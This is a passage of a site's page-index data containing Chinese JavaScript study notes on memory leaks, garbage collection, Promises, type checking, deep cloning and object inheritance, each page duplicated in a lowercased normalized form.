正常的代码运行，应该呈现内存增长，一段时间后垃圾被回收内存下降，如此循环...\n\n\n# 一些内存泄漏的场景\n\n * Vue中的事件总线event.bus在组件销毁时不被销毁\n * Dom的一些操作,addEventListener...,\n * 全局变量，未被销毁的setTimeout，setInterval\n\n# 一些基本的代码操作\n\n * 组件销毁时(beforeUnmount),使用bus.off,removeEventListener,clearInterval,clearTimeout....\n\n# WeakMap,WeakSet\n\nWeakMap,Map,Set\n\nWeakMap WeakSet 弱引用，不会影响垃圾回收。\n\n// 函数执行完，obj 会被销毁，因为外面的 WeakMap 是“弱引用”，不算在内\nconst wMap = new WeakMap()\nfunction fn() {\n    const obj = {\n        name: 'zhangsan'\n    }\n    // 注意，WeakMap 专门做弱引用的，因此 WeakMap 只接受对象作为键名（`null`除外），不接受其他类型的值作为键名。其他的无意义\n    wMap.set(obj, 100) \n}\nfn()\n// 代码执行完毕之后，obj 会被销毁，wMap 中也不再存在。但我们无法第一时间看到效果。因为：\n// 内存的垃圾回收机制，不是实时的，而且是 JS 代码控制不了的，因此这里不一定能直接看到效果。\n\n\n// 函数执行完，obj 会被销毁，因为外面的 WeakSet 是“弱引用”，不算在内\nconst wSet = new WeakSet()\nfunction fn() {\n    const obj = {\n        name: 'zhangsan'\n    }\n    wSet.add(obj) // 注意，WeakSet 就是为了做弱引用的，因此不能 add 值类型！！！无意义\n}\nfn()\n",normalizedContent:"# 内存泄露和垃圾回收\n\n\n# 内存泄漏\n\n * 不再用到的内存，没有及时释放，就叫做内存泄漏\n * 内存泄露就是不再被需要的内存, 由于某种原因,非预期, 无法被释放\n\n\n# 垃圾回收\n\n# 原理\n\n垃圾收集器会按照固定的时间间隔或代码执行中预约的收集时间，周期性地执行如下操做——找出再也不继续使用的变量，而后释放其占用的内存\n\n# 方法\n\n * 标记清除法(新) 当变量进入环境时，就标记这个变量为进入环境,从逻辑上讲，永远不能释放进入环境的变量所占的内存，永远不能释放进入环境变量所占用的内存，只要执行流程进入相应的环境，就可能用到他们。当离开环境时，就标记为离开环境。\n\n垃圾回收器在运行的时候会给存储在内存中的变量都加上标记（所有都加），然后去掉环境变量中的变量，以及被环境变量中的变量所引用的变量（条件性去除标记），删除所有被标记的变量，删除的变量无法在环境变量中被访问所以会被删除，最后垃圾回收器，完成了内存的清除工作，并回收他们所占用的内存\n\n * 引用计数法(旧) 当声明了一个变量并将一个引用类型值赋给该变量时，则该值的引用次数就是1；若是同一个值又被赋给另外一个变量，则该值的引用次数加1；若是包含对该值引用的变量又取得了另一个值，则该值的引用次数减1。当该值的引用次数变为0时，则能够回收其占用的内存空间。当垃圾回收器下一次运行时，就会释放那些引用次数为0的值所占用的内存\n\n晕吧... 举个例子 只要有引用堆内存的地方，引用计数就要加1。如果一个值的引用次数是0，就表示这个值不再用到了，因此可以将这块内存释放。\n\nvar a =[1,2]\nvar b = a\na = null\nconsole.log(b)\n//1.[1,2]这个数组开辟了一块内存，变量a对其引用了，所以引用计数为1。\n//2.变量b也引用了这个数组，引用计数为2。\n//3.a变量回收，引用计数为1\n//4.因为引用计数不为0，所以b打印[1,2]\n\n\n * 闭包中的数据常驻内存的场景\n   注:预期的引用导致数据不被回收，严格来说闭包不属于内存泄漏，只是闭包的数据不可以被回收\n\nfunction getdata(){\n  const data = {}\n  return {\n    get(key){\n      return data[key]\n    },\n    set(value){\n      data[key]=value\n    }\n  }\n}\nconst {get,set} = getdata()\nset('a',100)\nget('a')\n//当set执行之后，data中的数据会存储并且不会被回收，但这也是使用此闭包的预期结果，所以说闭包不是内存泄漏，这也是为什么慎用闭包的原因，因为数据变量的常驻内存\n\n\n\n# 如何检测js内存泄漏\n\n可使用 chrome devtools performance 来检测内存变化\n\n * 刷新页面，点击“gc”按钮\n * 点击“record”按钮开始记录，然后操作页面\n * 操作结束，点击“gc”按钮，点击“结束”按钮，看分析结果\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>memory change</title>\n</head>\n<body>\n    <p>\n        memory change\n        <button id=\"btn1\">start</button>\n    </p>\n\n    <script>\n        const arr = []\n        for (let i = 0; i < 10 * 10000; i++) {\n            arr.push(i)\n        }\n\n        function bind() {\n            // 模拟一个比较大的数据\n            const obj = {\n                str: json.stringify(arr) // 简单的拷贝\n            }\n\n            window.addeventlistener('resize', () => {\n                console.log(obj)\n            })\n        }\n\n        let n = 0\n        function start() {\n            settimeout(() => {\n                bind()\n                n++\n\n                // 执行 50 次\n                if (n < 50) {\n                    start()\n                } else {\n                    alert('done')\n                }\n            }, 200)\n        }\n\n        document.getelementbyid('btn1').addeventlistener('click', () => {\n            start()\n        })\n    <\/script>\n</body>\n</html>\n\n\n如图：\n\n- 图中的heap(堆)内存呈现主键升高的趋势，说明内存不断被垃圾占用，而垃圾缺得不到回收清楚。 - 正常的代码运行，应该呈现内存增长，一段时间后垃圾被回收内存下降，如此循环...\n\n\n# 一些内存泄漏的场景\n\n * vue中的事件总线event.bus在组件销毁时不被销毁\n * dom的一些操作,addeventlistener...,\n * 全局变量，未被销毁的settimeout，setinterval\n\n# 一些基本的代码操作\n\n * 组件销毁时(beforeunmount),使用bus.off,removeeventlistener,clearinterval,cleartimeout....\n\n# weakmap,weakset\n\nweakmap,map,set\n\nweakmap weakset 弱引用，不会影响垃圾回收。\n\n// 函数执行完，obj 会被销毁，因为外面的 weakmap 是“弱引用”，不算在内\nconst wmap = new weakmap()\nfunction fn() {\n    const obj = {\n        name: 'zhangsan'\n    }\n    // 注意，weakmap 专门做弱引用的，因此 weakmap 只接受对象作为键名（`null`除外），不接受其他类型的值作为键名。其他的无意义\n    wmap.set(obj, 100) \n}\nfn()\n// 代码执行完毕之后，obj 会被销毁，wmap 中也不再存在。但我们无法第一时间看到效果。因为：\n// 内存的垃圾回收机制，不是实时的，而且是 js 代码控制不了的，因此这里不一定能直接看到效果。\n\n\n// 函数执行完，obj 会被销毁，因为外面的 weakset 是“弱引用”，不算在内\nconst wset = new weakset()\nfunction fn() {\n    const obj = {\n        name: 'zhangsan'\n    }\n    wset.add(obj) // 注意，weakset 就是为了做弱引用的，因此不能 add 值类型！！！无意义\n}\nfn()\n",charsets:{cjk:!0}},{title:"同步和异步",frontmatter:{title:"同步和异步"},regularPath:"/webstudy/Javascript/%E5%90%8C%E6%AD%A5%E5%92%8C%E5%BC%82%E6%AD%A5.html",relativePath:"webstudy/Javascript/同步和异步.md",key:"v-30d3c3c0",path:"/webstudy/Javascript/%E5%90%8C%E6%AD%A5%E5%92%8C%E5%BC%82%E6%AD%A5.html",headers:[{level:2,title:"单线程和异步",slug:"单线程和异步",normalizedTitle:"单线程和异步",charIndex:2},{level:3,title:"js为什么是单线程",slug:"js为什么是单线程",normalizedTitle:"js为什么是单线程",charIndex:13},{level:3,title:"callback hell(回调地狱)",slug:"callback-hell-回调地狱",normalizedTitle:"callback hell(回调地狱)",charIndex:248},{level:3,title:"Promise",slug:"promise",normalizedTitle:"promise",charIndex:446},{level:3,title:"事件循环（Event Loop）",slug:"事件循环-event-loop",normalizedTitle:"事件循环（event loop）",charIndex:2837}],headersStr:"单线程和异步 js为什么是单线程 callback hell(回调地狱) Promise 事件循环（Event Loop）",content:"# 单线程和异步\n\n\n# js为什么是单线程\n\n * 作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定JavaScript同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准\n\n * Js就是单线程语言\n\n * Js和DOM渲染共用一个进程， 因为js可以修改DOM\n\n * 基于js是单线程语言，异步不会阻塞代码执行，同步会阻塞代码执行\n\n\n# callback hell(回调地狱)\n\najax1(url, () => {\n    ajax2(url, () => {\n        ajax3(url, () => {\n        doSomething()\n        })\n    })\n})\n\n\n * 如果有多层嵌套，代码耦合严重，那后续的维护，业务修改，原地爆炸\n * 无法使用try catch,也就无法排错\n\n\n# Promise\n\n嗨起来的promise面试题\n\n# 介绍\n\n * 三种状态： 等待态（Pending）、执行态（Fulfilled）和拒绝态（Rejected）\n * 状态只能由 Pending 变为 Fulfilled 或由 Pending 变为 Rejected ，且状态改变之后不会在发生变化，会一直保持这个状态。\n * Pending 变为 Fulfilled 会得到一个私有value，Pending 变为 Rejected会得到一个私有reason，当Promise达到了Fulfilled或Rejected时，执行的异步代码会接收到这个value或reason。\n\n# Promise.all()——短路特性\n\n * 如果所有都成功，则合成Promise的返回值就是所有子Promise的返回值数组。\n * 如果有一个失败，那么第一个失败的会把自己的理由作为合成Promise的失败理由\n\nlet p1 = new Promise((resolve, reject) => {  \n    resolve('success1')\n})\n\nlet p2 = new Promise((resolve, reject) => {  \n    resolve('success1')\n})\n// let p3 = Promise.reject('failed3')\nPromise.all([p1, p2]).then((result) => {  \n    console.log(result)   // ['success1', 'success2']             \n    \n}).catch((error) => {  \n    console.log(error)\n})\n// Promise.all([p1,p3,p2]).then((result) => {  \n//     console.log(result)\n// }).catch((error) => {  \n//     console.log(error) //  'failed3'     \n//     \n// })\n\n\n\n# Promise.allSettled()——用于解决primise.all的短路问题\n\n * Promise.allSettled跟Promise.all类似, 其参数接受一个Promise的数组, 返回一个新的Promise\n * 唯一的不同在于, 其不会进行短路, 也就是说当Promise全部处理完成后我们可以拿到每个Promise的状态, 而不管其是否处理成功.\n\n Promise.allSettled([\n  Promise.reject({ code: 500, msg: \"服务异常\" }),\n        Promise.resolve({ code: 200, list: [] }),\n        Promise.resolve({ ode: 200, list: [] })\n      ]).then(ret => {\n        /*\n            0: {status: \"rejected\", reason: {…}}\n             1: {status: \"fulfilled\", value: {…}}\n             2: {status: \"fulfilled\", value: {…}}   */\n        // 过滤掉 rejected 状态，尽可能多的保证页面区域数据渲染\n        RenderContent(\n          ret.filter(el => {\n            return el.status !== \"rejected\";\n          })\n        );\n      });\n\n\n# Promsie.race()\n\n# 手写Promise\n\nclass Promise{\n  constructor(executor){\n    // 初始化state为等待态\n    this.state = 'pending';\n    // 成功的值\n    this.value = undefined;\n    // 失败的原因\n    this.reason = undefined;\n    let resolve = value => {\n      if (this.state === 'pending') {\n        // resolve调用后，state转化为成功态\n        this.state = 'fulfilled';\n        // 储存成功的值\n        this.value = value;\n      }\n    };\n    let reject = reason => {\n      // state改变,reject调用就会失败\n      if (this.state === 'pending') {\n        // reject调用后，state转化为失败态\n        this.state = 'rejected';\n        // 储存失败的原因\n        this.reason = reason;\n      }\n    };\n    // 如果executor执行报错，直接执行reject\n    try{\n      executor(resolve, reject);\n    } catch (err) {\n      reject(err);\n    }\n  }\n}\n\n\n\n# 事件循环（Event Loop）\n\n一篇文章 一篇形象的文章\n\n# 1、执行栈与任务队列\n\n# 2、宏任务(macro task)与微任务(micro task)",normalizedContent:"# 单线程和异步\n\n\n# js为什么是单线程\n\n * 作为浏览器脚本语言，javascript的主要用途是与用户互动，以及操作dom。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定javascript同时有两个线程，一个线程在某个dom节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准\n\n * js就是单线程语言\n\n * js和dom渲染共用一个进程， 因为js可以修改dom\n\n * 基于js是单线程语言，异步不会阻塞代码执行，同步会阻塞代码执行\n\n\n# callback hell(回调地狱)\n\najax1(url, () => {\n    ajax2(url, () => {\n        ajax3(url, () => {\n        dosomething()\n        })\n    })\n})\n\n\n * 如果有多层嵌套，代码耦合严重，那后续的维护，业务修改，原地爆炸\n * 无法使用try catch,也就无法排错\n\n\n# promise\n\n嗨起来的promise面试题\n\n# 介绍\n\n * 三种状态： 等待态（pending）、执行态（fulfilled）和拒绝态（rejected）\n * 状态只能由 pending 变为 fulfilled 或由 pending 变为 rejected ，且状态改变之后不会在发生变化，会一直保持这个状态。\n * pending 变为 fulfilled 会得到一个私有value，pending 变为 rejected会得到一个私有reason，当promise达到了fulfilled或rejected时，执行的异步代码会接收到这个value或reason。\n\n# promise.all()——短路特性\n\n * 如果所有都成功，则合成promise的返回值就是所有子promise的返回值数组。\n * 如果有一个失败，那么第一个失败的会把自己的理由作为合成promise的失败理由\n\nlet p1 = new promise((resolve, reject) => {  \n    resolve('success1')\n})\n\nlet p2 = new promise((resolve, reject) => {  \n    resolve('success1')\n})\n// let p3 = promise.reject('failed3')\npromise.all([p1, p2]).then((result) => {  \n    console.log(result)   // ['success1', 'success2']             \n    \n}).catch((error) => {  \n    console.log(error)\n})\n// promise.all([p1,p3,p2]).then((result) => {  \n//     console.log(result)\n// }).catch((error) => {  \n//     console.log(error) //  'failed3'     \n//     \n// })\n\n\n\n# promise.allsettled()——用于解决primise.all的短路问题\n\n * promise.allsettled跟promise.all类似, 其参数接受一个promise的数组, 返回一个新的promise\n * 唯一的不同在于, 其不会进行短路, 也就是说当promise全部处理完成后我们可以拿到每个promise的状态, 而不管其是否处理成功.\n\n promise.allsettled([\n  promise.reject({ code: 500, msg: \"服务异常\" }),\n        promise.resolve({ code: 200, list: [] }),\n        promise.resolve({ ode: 200, list: [] })\n      ]).then(ret => {\n        /*\n            0: {status: \"rejected\", reason: {…}}\n             1: {status: \"fulfilled\", value: {…}}\n             2: {status: \"fulfilled\", value: {…}}   */\n        // 过滤掉 rejected 状态，尽可能多的保证页面区域数据渲染\n        rendercontent(\n          ret.filter(el => {\n            return el.status !== \"rejected\";\n          })\n        );\n      });\n\n\n# promsie.race()\n\n# 手写promise\n\nclass promise{\n  constructor(executor){\n    // 初始化state为等待态\n    this.state = 'pending';\n    // 成功的值\n    this.value = undefined;\n    // 失败的原因\n    this.reason = undefined;\n    let resolve = value => {\n      if (this.state === 'pending') {\n        // resolve调用后，state转化为成功态\n        this.state = 'fulfilled';\n        // 储存成功的值\n        this.value = value;\n      }\n    };\n    let reject = reason => {\n      // state改变,reject调用就会失败\n      if (this.state === 'pending') {\n        // reject调用后，state转化为失败态\n        this.state = 'rejected';\n        // 储存失败的原因\n        this.reason = reason;\n      }\n    };\n    // 如果executor执行报错，直接执行reject\n    try{\n      executor(resolve, reject);\n    } catch (err) {\n      reject(err);\n    }\n  }\n}\n\n\n\n# 事件循环（event loop）\n\n一篇文章 一篇形象的文章\n\n# 1、执行栈与任务队列\n\n# 2、宏任务(macro task)与微任务(micro task)",charsets:{cjk:!0}},{title:"堆栈模型",frontmatter:{title:"堆栈模型"},regularPath:"/webstudy/Javascript/%E5%A0%86%E6%A0%88%E6%A8%A1%E5%9E%8B.html",relativePath:"webstudy/Javascript/堆栈模型.md",key:"v-230a2f15",path:"/webstudy/Javascript/%E5%A0%86%E6%A0%88%E6%A8%A1%E5%9E%8B.html",headers:[{level:2,title:"堆栈",slug:"堆栈",normalizedTitle:"堆栈",charIndex:2},{level:3,title:"大概的一个流程图",slug:"大概的一个流程图",normalizedTitle:"大概的一个流程图",charIndex:9},{level:3,title:"为什么区分堆栈",slug:"为什么区分堆栈",normalizedTitle:"为什么区分堆栈",charIndex:311},{level:3,title:"类型判断",slug:"类型判断",normalizedTitle:"类型判断",charIndex:35},{level:3,title:"接下来-深拷贝",slug:"接下来-深拷贝",normalizedTitle:"接下来-深拷贝",charIndex:1605},{level:2,title:"变量计算和类型转换",slug:"变量计算和类型转换",normalizedTitle:"变量计算和类型转换",charIndex:2071},{level:3,title:"==和===",slug:"和",normalizedTitle:"==和===",charIndex:2085},{level:3,title:"if语句和逻辑运算符",slug:"if语句和逻辑运算符",normalizedTitle:"if语句和逻辑运算符",charIndex:2266}],headersStr:"堆栈 大概的一个流程图 为什么区分堆栈 类型判断 接下来-深拷贝 变量计算和类型转换 ==和=== if语句和逻辑运算符",content:'# 堆栈\n\n\n# 大概的一个流程图\n\n堆栈——>值类型/引用类型——>类型判断——>深拷贝\n\n请看一个简单的列子:\n\n//值类型\nlet a=1\nlet b=a\nb = 2\nconsole.log(a) //1\n//引用类型\nlet a = {num:1},\nlet b = a\nb.num = 2\nconsole.log(a.num) //2\n\n\n如下图:\n\n * 当给a赋值成一个对象->会在堆中申请一个内存地址，存储对象->此时a其实指向的是内存地址1，而不是对象，是内存地址指向这个对象\n * 当声明b=a,其实是b指向内存地址1\n * 如果此时修改b.age的值，再访问a.age,那么a.age会改变\n\n\n# 为什么区分堆栈\n\n简单说，基于性能，值类型如number，string占用内存小，但引用类型数据量大，操作数据时速度会很慢，同时如object等存放于栈中也不便于管理。\n\n\n# 类型判断\n\n# typeof\n\n * 识别所有的值类型，包括es6中的symbol\n * 识别函数\n\n  typeof console.log() //\'function\'\n  typeof function(){} //\'function\'\n\n\n * 判断是否是引用类型（但对于识别是Object还是Array那就无能为力了）\n\n  typeof null //\'object\' null是一个空的引用类型，有一个空地址\n  typeof {} //\'object\'\n  typeof [] //\'object\'\n\n\n# instanceof\n\n在原型中会详解instanceof......\n\n# 还有一个Object.prototype.toString\n\n * 如果需要通用检测数据类型，可以采用Object.prototype.toString，调用该方法，统一返回格式“[object Xxx]”的字符串\n\nObject.prototype.toString({})       // "[object Object]"\nObject.prototype.toString.call({})  // 同上结果，加上call也ok\nObject.prototype.toString.call(1)    // "[object Number]"\nObject.prototype.toString.call(\'1\')  // "[object String]"\nObject.prototype.toString.call(true)  // "[object Boolean]"\nObject.prototype.toString.call(function(){})  // "[object Function]"\nObject.prototype.toString.call(null)   //"[object Null]"\nObject.prototype.toString.call(undefined) //"[object Undefined]"\nObject.prototype.toString.call(/123/g)    //"[object RegExp]"\nObject.prototype.toString.call(new Date()) //"[object Date]"\nObject.prototype.toString.call([])       //"[object Array]"\nObject.prototype.toString.call(document)  //"[object HTMLDocument]"\nObject.prototype.toString.call(window)   //"[object Window]"\n\n\n\n# 接下来-深拷贝\n\n * 如何像值类型一样操作引用类型赋值深拷贝\n\n老生常谈，反反复复\n\nfunction deepClone(obj = {}) {\n    if (typeof obj !== "object" || obj == null) {\n      return obj;\n    }\n    let result;\n    if (obj instanceof Array) {\n      result = [];\n    } else {\n      result = {};\n    }\n    for (let key in obj) {\n      if (obj.hasOwnProperty(key)) {\n        //obj.hasOwnProperty(key)? 保证key不是原型的属性\n        //接下来递归\n        result[key] = deepClone(obj[key]);\n      }\n    }\n    return result\n  }\n\n\n\n# 变量计算和类型转换\n\n\n# ==和===\n\n0==\'\' //true\n0== false //true\nnull==undefined //true\n\n\n==所造成的困扰，不需要非死记硬背，最好的办法在代码中除了==null，其余全部===\n\nif(obj.a==null){}\n//相当于\n// if（obj.a===null || obj.a=== undefined){}\n\n\n\n# if语句和逻辑运算符\n\n# if语句中的truly和falsely\n\n * truly变量 !!a === true\n * falsely变量 !!a === false\n\n除了一下falsely变量其他都是truly变量\n\n!!0 === false\n!!Nan === false\n!!\'\'=== false\n!!null === false \n!!undefined=== false\n!!false=== false\n\n\n# 逻辑运算符\n\nconsole.log(10 && 0) //0 为什么？10是truly，继续向后判断 &&，遇到0是falsely，直接返回0\nconsole.log(0 && 10) // 0 同上\nconsole.log(\'\'||\'abc\') // abc\nconsole.log(\'abc\'||\'\') // abc\n',normalizedContent:'# 堆栈\n\n\n# 大概的一个流程图\n\n堆栈——>值类型/引用类型——>类型判断——>深拷贝\n\n请看一个简单的列子:\n\n//值类型\nlet a=1\nlet b=a\nb = 2\nconsole.log(a) //1\n//引用类型\nlet a = {num:1},\nlet b = a\nb.num = 2\nconsole.log(a.num) //2\n\n\n如下图:\n\n * 当给a赋值成一个对象->会在堆中申请一个内存地址，存储对象->此时a其实指向的是内存地址1，而不是对象，是内存地址指向这个对象\n * 当声明b=a,其实是b指向内存地址1\n * 如果此时修改b.age的值，再访问a.age,那么a.age会改变\n\n\n# 为什么区分堆栈\n\n简单说，基于性能，值类型如number，string占用内存小，但引用类型数据量大，操作数据时速度会很慢，同时如object等存放于栈中也不便于管理。\n\n\n# 类型判断\n\n# typeof\n\n * 识别所有的值类型，包括es6中的symbol\n * 识别函数\n\n  typeof console.log() //\'function\'\n  typeof function(){} //\'function\'\n\n\n * 判断是否是引用类型（但对于识别是object还是array那就无能为力了）\n\n  typeof null //\'object\' null是一个空的引用类型，有一个空地址\n  typeof {} //\'object\'\n  typeof [] //\'object\'\n\n\n# instanceof\n\n在原型中会详解instanceof......\n\n# 还有一个object.prototype.tostring\n\n * 如果需要通用检测数据类型，可以采用object.prototype.tostring，调用该方法，统一返回格式“[object xxx]”的字符串\n\nobject.prototype.tostring({})       // "[object object]"\nobject.prototype.tostring.call({})  // 同上结果，加上call也ok\nobject.prototype.tostring.call(1)    // "[object number]"\nobject.prototype.tostring.call(\'1\')  // "[object string]"\nobject.prototype.tostring.call(true)  // "[object boolean]"\nobject.prototype.tostring.call(function(){})  // "[object function]"\nobject.prototype.tostring.call(null)   //"[object null]"\nobject.prototype.tostring.call(undefined) //"[object undefined]"\nobject.prototype.tostring.call(/123/g)    //"[object regexp]"\nobject.prototype.tostring.call(new date()) //"[object date]"\nobject.prototype.tostring.call([])       //"[object array]"\nobject.prototype.tostring.call(document)  //"[object htmldocument]"\nobject.prototype.tostring.call(window)   //"[object window]"\n\n\n\n# 接下来-深拷贝\n\n * 如何像值类型一样操作引用类型赋值深拷贝\n\n老生常谈，反反复复\n\nfunction deepclone(obj = {}) {\n    if (typeof obj !== "object" || obj == null) {\n      return obj;\n    }\n    let result;\n    if (obj instanceof array) {\n      result = [];\n    } else {\n      result = {};\n    }\n    for (let key in obj) {\n      if (obj.hasownproperty(key)) {\n        //obj.hasownproperty(key)? 保证key不是原型的属性\n        //接下来递归\n        result[key] = deepclone(obj[key]);\n      }\n    }\n    return result\n  }\n\n\n\n# 变量计算和类型转换\n\n\n# ==和===\n\n0==\'\' //true\n0== false //true\nnull==undefined //true\n\n\n==所造成的困扰，不需要非死记硬背，最好的办法在代码中除了==null，其余全部===\n\nif(obj.a==null){}\n//相当于\n// if（obj.a===null || obj.a=== undefined){}\n\n\n\n# if语句和逻辑运算符\n\n# if语句中的truly和falsely\n\n * truly变量 !!a === true\n * falsely变量 !!a === false\n\n除了一下falsely变量其他都是truly变量\n\n!!0 === false\n!!nan === false\n!!\'\'=== false\n!!null === false \n!!undefined=== false\n!!false=== false\n\n\n# 逻辑运算符\n\nconsole.log(10 && 0) //0 为什么？10是truly，继续向后判断 &&，遇到0是falsely，直接返回0\nconsole.log(0 && 10) // 0 同上\nconsole.log(\'\'||\'abc\') // abc\nconsole.log(\'abc\'||\'\') // abc\n',charsets:{cjk:!0}},{title:"对象的创建与继承",frontmatter:{title:"对象的创建与继承"},regularPath:"/webstudy/Javascript/%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA%E4%B8%8E%E7%BB%A7%E6%89%BF.html",relativePath:"webstudy/Javascript/对象的创建与继承.md",key:"v-4d586035",path:"/webstudy/Javascript/%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA%E4%B8%8E%E7%BB%A7%E6%89%BF.html",headers:[{level:3,title:"创建",slug:"创建",normalizedTitle:"创建",charIndex:5},{level:3,title:"继承",slug:"继承",normalizedTitle:"继承",charIndex:8}],headersStr:"创建 继承",content:'# 对象的创建与继承\n\n\n# 创建\n\n * {}\n * new Object()\n * 使用字面量\n * 工厂模式\n * 构造函数模式（constructor）\n * 原型模式（prototype）\n * 构造函数+原型模式\n\n{} / new Object / 字面量\n\n//\nvar a = {};\na.name = "jack";\na.say = function () {\n  alert(this.name);\n};\n//\nvar b = new Object();\nb.name = "zhangsna";\n// 字面量\nvar person = { name: "zhangsan", age: 18 };\n\n\n工厂模式\n\n * 缺点：调用的还是不同的方法,方法不共享\n\nfunction createPerson(name) {\n  var obj = {\n    name: name,\n    setName: function (name) {\n      this.name = name;\n    },\n  };\n  return obj;\n}\nvar p1 = createPerson("Tom");\nvar p2 = createPerson("Mary");\n\n\n构造函数模式（constructor）\n\n * 缺点:new 的每个对象都有相同的数据（方法），\n\nfunction Person(name) {\n  this.name = name;\n  this.setName = function (name) {\n    this.name = name;\n  };\n}\nvar p1 = new Person("Tom");\nvar p2 = new Person("Mary");\n\n\n原型模式\n\n * 缺点：假如原型中包含有引用类型的属性，那么如果某个对象修改了该属性的值，所有的该原型创建的对象访问的值都会改变\n\nfunction Animal() {}\nAnimal.prototype = {\n  name: "animal",\n  friends: ["dog", "cat"],\n  sayName: function () {\n    alert(this.name);\n  },\n};\nvar a1 = new Animal();\nvar a2 = new Animal();\na2.friends.push("snake");\nalert(a2.friends); //[dog,cat,snake]\nalert(a1.friends); //[dog,cat,snake]\n\n\n构造函数 + 原型的组合模式 属性在函数中初始化，方法添加到原型上\n\nfunction Animal(name) {\n  this.name = name;\n  this.friends = ["dog", "cat"];\n}\nAnimal.prototype.sayName = function () {\n  alert(this.name);\n};\nvar a1 = new Animal("d");\nvar a2 = new Animal("c");\na1.friends.push("snake");\nalert(a1.friends); //[dog,caxt,snake]\nalert(a2.friends); //[dog,cat]\n\n\n\n# 继承\n\n * 原型链继承\n * 借用构造函数继承\n * 组合继承\n * 原型式继承\n * 寄生式继承\n * 寄生组合式继承\n * class extends\n\n原型链继承\n\nfunction Parent1() {\n  this.name = "parent1";\n  this.play = [1, 2, 3];\n}\nfunction Child1() {\n  this.type = "child2";\n}\nChild1.prototype = new Parent1();\nchild2.prototype = new Parent1();\nconsole.log(new Child1());\n\nlet s1 = new Child1();\nlet s2 = new Child2();\ns1.play.push(4);\nconsole.log(s1.play, s2.play); //打印的都是[1,2,3,4]\n// 缺点:两个实例使用的是同一个原型对象。它们的内存空间是共享的，当一个发生变化的时候，另外一个也随之进行了变化，这就是使用原型链继承方式的一个缺点\n\n\n借用构造函数继承\n\nfunction Fruit(name) {\n  this.name = name;\n}\nfunction Apple() {\n  Fruit.call(this, "apple");\n}\n\n\n组合继承\n\nfunction Fruit(name) {\n  this.name = name;\n}\nFruit.prototype.sayName = function () {\n  console.log(this.name);\n};\n\nfunction Apple(name) {\n  Fruit.call(this, name);\n}\nApple.prototype = new Fruit();\nApple.prototype.constructor = Apple;\n\n\n原型式继承\n\nfunction object(o) {\n  function F() {}\n  F.prototype = o;\n  return new F();\n}\n',normalizedContent:'# 对象的创建与继承\n\n\n# 创建\n\n * {}\n * new object()\n * 使用字面量\n * 工厂模式\n * 构造函数模式（constructor）\n * 原型模式（prototype）\n * 构造函数+原型模式\n\n{} / new object / 字面量\n\n//\nvar a = {};\na.name = "jack";\na.say = function () {\n  alert(this.name);\n};\n//\nvar b = new object();\nb.name = "zhangsna";\n// 字面量\nvar person = { name: "zhangsan", age: 18 };\n\n\n工厂模式\n\n * 缺点：调用的还是不同的方法,方法不共享\n\nfunction createperson(name) {\n  var obj = {\n    name: name,\n    setname: function (name) {\n      this.name = name;\n    },\n  };\n  return obj;\n}\nvar p1 = createperson("tom");\nvar p2 = createperson("mary");\n\n\n构造函数模式（constructor）\n\n * 缺点:new 的每个对象都有相同的数据（方法），\n\nfunction person(name) {\n  this.name = name;\n  this.setname = function (name) {\n    this.name = name;\n  };\n}\nvar p1 = new person("tom");\nvar p2 = new person("mary");\n\n\n原型模式\n\n * 缺点：假如原型中包含有引用类型的属性，那么如果某个对象修改了该属性的值，所有的该原型创建的对象访问的值都会改变\n\nfunction animal() {}\nanimal.prototype = {\n  name: "animal",\n  friends: ["dog", "cat"],\n  sayname: function () {\n    alert(this.name);\n  },\n};\nvar a1 = new animal();\nvar a2 = new animal();\na2.friends.push("snake");\nalert(a2.friends); //[dog,cat,snake]\nalert(a1.friends); //[dog,cat,snake]\n\n\n构造函数 + 原型的组合模式 属性在函数中初始化，方法添加到原型上\n\nfunction animal(name) {\n  this.name = name;\n  this.friends = ["dog", "cat"];\n}\nanimal.prototype.sayname = function () {\n  alert(this.name);\n};\nvar a1 = new animal("d");\nvar a2 = new animal("c");\na1.friends.push("snake");\nalert(a1.friends); //[dog,caxt,snake]\nalert(a2.friends); //[dog,cat]\n\n\n\n# 继承\n\n * 原型链继承\n * 借用构造函数继承\n * 组合继承\n * 原型式继承\n * 寄生式继承\n * 寄生组合式继承\n * class extends\n\n原型链继承\n\nfunction parent1() {\n  this.name = "parent1";\n  this.play = [1, 2, 3];\n}\nfunction child1() {\n  this.type = "child2";\n}\nchild1.prototype = new parent1();\nchild2.prototype = new parent1();\nconsole.log(new child1());\n\nlet s1 = new child1();\nlet s2 = new child2();\ns1.play.push(4);\nconsole.log(s1.play, s2.play); //打印的都是[1,2,3,4]\n// 缺点:两个实例使用的是同一个原型对象。它们的内存空间是共享的，当一个发生变化的时候，另外一个也随之进行了变化，这就是使用原型链继承方式的一个缺点\n\n\n借用构造函数继承\n\nfunction fruit(name) {\n  this.name = name;\n}\nfunction apple() {\n  fruit.call(this, "apple");\n}\n\n\n组合继承\n\nfunction fruit(name) {\n  this.name = name;\n}\nfruit.prototype.sayname = function () {\n  console.log(this.name);\n};\n\nfunction apple(name) {\n  fruit.call(this, name);\n}\napple.prototype = new fruit();\napple.prototype.constructor = apple;\n\n\n原型式继承\n\nfunction object(o) {\n  function f() {}\n  f.prototype = o;\n  return new f();\n}\n',charsets:{cjk:!0}},{title:"异步、单线程",frontmatter:{title:"异步、单线程"},regularPath:"/webstudy/Javascript/%E5%BC%82%E6%AD%A5%E3%80%81%E5%8D%95%E7%BA%BF%E7%A8%8B.html",relativePath:"webstudy/Javascript/异步、单线程.md",key:"v-60d5aae6",path:"/webstudy/Javascript/%E5%BC%82%E6%AD%A5%E3%80%81%E5%8D%95%E7%BA%BF%E7%A8%8B.html",headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"nodejs 多进程",frontmatter:{title:"nodejs 